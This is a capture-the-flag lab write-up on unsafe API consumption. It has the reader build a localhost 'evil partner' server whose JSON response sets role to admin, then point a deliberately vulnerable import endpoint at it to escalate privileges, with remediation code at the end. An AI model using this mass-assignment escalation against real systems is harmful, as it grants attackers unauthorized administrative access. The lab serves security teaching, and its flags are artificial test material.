# Lab 15: Unsafe Consumption of APIs — Malicious Partner API

## Overview

| Field          | Details                                               |
|----------------|-------------------------------------------------------|
| **Objective**  | Stand up a fake "partner API" and use it to escalate privileges via blind trust |
| **Difficulty** | ⭐⭐ Medium                                           |
| **Time**       | 45 minutes                                            |
| **Category**   | Third-Party Integration / Unsafe Data Consumption       |
| **OWASP**      | API10:2023 - Unsafe Consumption of APIs                 |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5001`
- Python 3 with the `requests` library
- Ability to run a second, local Python process on your own machine (the "malicious partner API") — everything in this lab stays on `localhost`, no external network access is needed

---

## Background

Developers often assume that data coming back from an **outbound** request (one their own server initiated) is inherently trustworthy — after all, "we chose to call that API." That assumption breaks down whenever the destination URL is configurable, or when the "partner" is itself untrusted or compromised.

SocialHack API has a "partner profile import" feature: `POST /api/v1/integrations/import-profile` fetches JSON from a caller-supplied `source_url` and copies every field in the response directly onto the authenticated user's database record — including `role` and `is_verified`. There is no allow-list of trusted partner domains and no schema validation on the response. This lab has you build the malicious "partner" yourself, entirely on localhost, to see exactly how that trust gets abused.

---

## Tasks

### Task 1: Build a Fake Partner API

Create a file called `evil_partner.py` on your machine:

```python
#!/usr/bin/env python3
"""Fake malicious partner API for lab use — binds to localhost only."""
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

class EvilPartnerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        payload = {
            "bio": "Verified via PartnerTrust Inc.",
            "role": "admin",
            "is_verified": True,
        }
        body = json.dumps(payload).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format, *args):
        print(f"[evil_partner] {self.address_string()} - {format % args}")

if __name__ == "__main__":
    server = HTTPServer(("127.0.0.1", 8888), EvilPartnerHandler)
    print("[*] Evil partner API listening on http://127.0.0.1:8888/profile.json")
    server.serve_forever()
```

Run it in its own terminal:
```bash
python3 evil_partner.py
```

<details>
<summary>💡 Hint 1</summary>
Any HTTP server that returns valid JSON works here — the vulnerable endpoint doesn't check the Content-Type header or the server that sent it.
</details>

---

### Task 2: Log In as a Regular User and Confirm Current Role

**Python example:**
```python
import requests

BASE = "http://localhost:5001/api/v1"

r = requests.post(f"{BASE}/auth/login", json={"username": "alice", "password": "password123"})
token = r.json()["token"]
headers = {"Authorization": f"Bearer {token}"}
print("Role before attack:", r.json()["user"]["role"])
```

---

### Task 3: Point the Import Endpoint at Your Malicious Partner API

**Python example:**
```python
r = requests.post(f"{BASE}/integrations/import-profile", headers=headers, json={
    "source_url": "http://127.0.0.1:8888/profile.json",
})
print(r.json())
```

**🚩 FLAG 1: What fields does the API response say were "applied from partner"?**

<details>
<summary>💡 Hint 1</summary>
Look at the "fields_applied_from_partner" key in the response — it should include `role` and `is_verified`, not just `bio`.
</details>

---

### Task 4: Verify the Privilege Escalation

**Python example:**
```python
r = requests.post(f"{BASE}/auth/login", json={"username": "alice", "password": "password123"})
print("Role after attack:", r.json()["user"]["role"])
```

**🚩 FLAG 2: Confirm alice's role changed to `admin` purely from consuming your fake partner API's response**

<details>
<summary>💡 Hint 1</summary>
If the role changed without you ever calling an admin endpoint or forging a JWT, that confirms the vulnerability is in how the *response* is consumed, not in authentication itself.
</details>

---

### Task 5: Exchange Rate Endpoint — Unchecked Numeric Trust

**Steps:**
1. Modify `evil_partner.py` to also serve a `rate` field with an unrealistic value (e.g. `-999999` or `999999999`)
2. Call the exchange-rate endpoint pointing at your server

**Python example:**
```python
r = requests.get(f"{BASE}/integrations/exchange-rate",
                  headers=headers,
                  params={"provider": "http://127.0.0.1:8888/profile.json"})
print(r.json())
```

**🚩 FLAG 3: Confirm the API returns your attacker-supplied rate value with no sanity/range check**

<details>
<summary>💡 Hint 1</summary>
In a real financial or e-commerce API, an unchecked externally-supplied numeric value like this could flow into a price calculation or a payout — this is the kind of bug that shows up as a business-impact finding, not just a technical one.
</details>

---

## Flags to Find

| Flag   | Description                                                | Hint                                          |
|--------|----------------------------------------------------------------|--------------------------------------------------|
| FLAG 1 | Fields the API admits it applied from the partner response     | Check `fields_applied_from_partner` in response   |
| FLAG 2 | Confirm role escalated to admin via the import endpoint         | Re-login and check the returned role              |
| FLAG 3 | Confirm an unchecked rate value is echoed back                  | `GET /integrations/exchange-rate`                 |

---

## Remediation

### 1. Allow-list Trusted Partner Domains
```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = {"api.trustedpartner.com"}

if urlparse(source_url).hostname not in ALLOWED_DOMAINS:
    return jsonify({"error": "Untrusted source"}), 400
```

### 2. Validate the Response Against a Strict Schema
```python
from pydantic import BaseModel

class PartnerProfileSchema(BaseModel):
    bio: str
    avatar_url: str | None = None
    # role, is_verified are intentionally NOT in this schema

validated = PartnerProfileSchema(**partner_data)
```

### 3. Never Mass-Assign From External Data — Use an Explicit Field Map
```python
SAFE_FIELDS_FROM_PARTNER = ("bio", "avatar_url")
for field in SAFE_FIELDS_FROM_PARTNER:
    if field in partner_data:
        setattr(user, field, partner_data[field])
```

### 4. Harden the Outbound Request Itself
```python
resp = requests.get(source_url, timeout=5, allow_redirects=False, verify=True)
```

### 5. Range/Sanity-Check Any Numeric Values Consumed From Third Parties
```python
rate = payload.get("rate")
if not isinstance(rate, (int, float)) or not (0 < rate < 10000):
    return jsonify({"error": "Provider returned an implausible rate"}), 502
```

---

## References

- [OWASP API Security Top 10 - API10:2023](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
